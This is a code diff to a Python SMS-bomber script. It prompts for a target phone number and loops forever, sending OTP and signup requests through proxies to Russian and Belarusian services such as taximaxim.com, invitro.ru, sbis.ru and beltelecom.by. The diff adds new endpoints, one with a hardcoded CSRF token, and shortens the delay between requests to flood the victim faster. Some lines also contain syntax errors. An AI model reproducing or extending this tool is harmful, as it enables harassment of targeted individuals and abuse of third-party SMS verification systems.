@@ -49,8 +49,8 @@ try:
 except Exception:
     pass
 
-a = input('Enter Number With + : ')
-b = 30
+a = input('Select target:')
+b = 10
 class services():
 	# service number 1
 	def service1(self, a, proxies):
@@ -96,8 +96,8 @@ class services():
 
 	# service number 8
 	def service8(self, a, proxies):
-		r = requests.post('https://login.web.ajio.com/api/auth/signupSendOTP'',
-			data=data, proxies=proxies)
+		r = requests.post('https://client.taximaxim.com/site/send-code/?type=0',
+			data = {"_csrf":"SuyaDpUnfWWvTkF8GytL1zAJqUUvLMc_SUXaEGhXsoQa2tJvwF8nC_YJEQpaHhKkVGCRIhljrggQJ4ljCW-G4Q==","LoginForm[org]":"maxim","LoginForm[country]":"ru","LoginForm[baseId]":"11","LoginForm[phone]":a,"LoginForm[code]":"","LoginForm[agree]":"0"}, proxies=proxies)
 		print('taximaxim.com ' + str(r.status_code))
 
 	# service number 9
@@ -242,6 +242,21 @@ class services():
 	def service30(self, a, proxies):
 		r = requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': a})
 		print('invitro.ru ' + str(r.status_cod))
+
+	# service number 31
+	def service31(self, a, proxies):
+		r = requests.post('https://online.sbis.ru/reg/service/',
+			json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':a},'id':'1'},
+			proxies=proxies)
+		print('sbis.ru ' + str(r.status_code))
+
+	# service number 32
+	def service32(self, a, proxies):
+		r = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru',
+			data={'phone': a},
+			proxies=proxies)
+		print('beltelecom.by ' + str(r.status_code))
+
 while 1:
 	services().service1(a,proxies)
 	sleep(b)
@@ -300,4 +315,8 @@ while 1:
 	services().service29(a,proxies)
 	sleep(b)
 	services().service30(a,proxies)
+	sleep(b)
+	services().service31(a,proxies)
+	sleep(b)
+	services().service32(a,proxies)
 	sleep(b)
